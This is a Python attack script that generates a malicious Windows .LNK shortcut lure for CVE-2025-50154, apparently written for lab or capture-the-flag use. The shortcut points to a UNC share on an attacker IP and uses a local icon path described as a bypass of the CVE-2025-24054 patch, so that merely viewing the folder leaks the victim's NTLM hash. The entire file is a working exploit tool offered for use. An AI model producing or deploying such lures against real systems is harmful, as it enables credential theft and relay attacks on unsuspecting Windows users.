#!/usr/bin/env python3
"""Create .LNK shortcut lure for NTLM leak (CVE-2025-50154).

Usage: python3 create_lnk_lure.py <attacker_ip> <output.lnk>

Note: This creates a Python script that generates the .LNK file.
Run the generated script on Windows with pywin32 installed.
"""

import sys

def create_lnk_generator(attacker_ip, output_script):
    """Generate a Python script that creates the .LNK file."""
    
    script_content = f'''#!/usr/bin/env python3
"""Generate .LNK file for NTLM leak.

Requires: pywin32 (pip install pywin32)
Run on Windows or Wine.
"""

import win32com.client
import os

ATTACKER_IP = "{attacker_ip}"
OUTPUT_LNK = "{output_script.replace('.py', '.lnk')}"

# Create WScript.Shell COM object
w = win32com.client.Dispatch("WScript.Shell")
sc = w.CreateShortcut(OUTPUT_LNK)

# Set the target to attacker UNC path
sc.TargetPath = f"\\\\\\\\{ATTACKER_IP}\\\\share\\\\payload.exe"
sc.WorkingDirectory = f"\\\\\\\\{ATTACKER_IP}\\\\share"
sc.Description = "Click to open"

# Use local icon to bypass CVE-2025-24054 patch
# This is the CVE-2025-50154 bypass technique
sc.IconLocation = "C:\\\\Windows\\\\System32\\\\SHELL32.dll,0"

sc.Save()
print(f"[+] Created {OUTPUT_LNK}")
print(f"[*] Merely viewing the folder with this .LNK triggers NTLM leak")
'''
    
    with open(output_script, 'w', encoding='utf-8') as f:
        f.write(script_content)
    
    print(f"[+] Created {output_script}")
    print(f"[*] To generate the .LNK file:")
    print(f"    1. Copy this script to Windows")
    print(f"    2. Install pywin32: pip install pywin32")
    print(f"    3. Run: python3 {output_script}")
    print(f"[*] The .LNK file will be created in the same directory")

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 create_lnk_lure.py <attacker_ip> <output.lnk>")
        print("Example: python3 create_lnk_lure.py 10.10.14.2 lure.lnk")
        sys.exit(1)
    
    attacker_ip = sys.argv[1]
    output_file = sys.argv[2]
    
    if not output_file.endswith('.lnk'):
        output_file += '.lnk'
    
    # Generate a Python script that creates the .LNK
    script_name = output_file.replace('.lnk', '_generator.py')
    create_lnk_generator(attacker_ip, script_name)

if __name__ == '__main__':
    main()
